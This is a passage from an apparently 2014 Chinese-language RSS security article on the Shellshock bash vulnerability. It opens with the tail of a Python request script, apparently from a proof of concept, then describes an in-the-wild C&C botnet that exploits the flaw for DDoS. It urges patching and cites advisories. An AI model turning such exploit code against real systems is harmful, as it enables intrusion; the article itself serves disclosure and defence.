    conn.request(&quot;GET&quot;,sys.argv[2],headers=headers)

    res = conn.getresponse()

    print res.status, res.reason

    data = res.read()

    print data


------------------------------------------------------------------------&lt;/code&gt;&lt;p&gt;的工具，Shellshock比heartbleed更容易自动化的去攻击目标，漏洞本身的特性带来了最糟糕的情况就是蠕虫的产生，这种担心已经得到了证实：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://gist.github.com/anonymous/929d622f3b36b00c0be1&quot; data-editable=&quot;true&quot; data-title=&quot;Ok, shits real. Its in the wild... src:162.253.66.76&quot; class=&quot;&quot;&gt;Ok, shits real. Its in the wild... src:162.253.66.76&lt;/a&gt;&lt;/p&gt;&lt;p&gt;虽然目前的样本不是蠕虫，但很明显，僵尸网络的狂欢已经开始，从目前样本的情况看，这是一个有C&amp;amp;C功能的botnet，&quot;她&quot;会先寻找busybox的目标，然后尝试入侵目标机，之后尝试提权，这个恶意软件主要目的是利用肉鸡来DDOS，攻击者的下一个目标将会是WEB。&lt;/p&gt;&lt;p&gt;通常来讲，一个漏洞曝光到自动化利用会在24小时内完成，所以各位抓紧时间打补丁。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.gnu.org/software/bash/&quot; data-editable=&quot;true&quot; data-title=&quot;[1] BASH&quot;&gt;[1] BASH&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/&quot; data-editable=&quot;true&quot; data-title=&quot;[2] Bash specially-crafted environment variables code injection attack&quot;&gt;[2] Bash specially-crafted environment variables code injection attack&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot; data-editable=&quot;true&quot; data-title=&quot;[3] CVE-2014-6271&quot;&gt;[3] CVE-2014-6271&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169&quot; data-editable=&quot;true&quot; data-title=&quot;[4] CVE-2014-7169&quot;&gt;[4] CVE-2014-7169&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://seclists.org/oss-sec/2014/q3/651&quot; data-editable=&quot;true&quot; data-title=&quot;[5] CVE-2014-6271: remote code execution through bash&quot;&gt;[5] CVE-2014-6271: remote code execution through bash&lt;/a&gt;&lt;/p&gt;</description>
<author>瞌睡龙</author>
<guid isPermaLink="false">2014-09-26-19857156</guid>
<pubDate>Fri, 26 Sep 2014 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
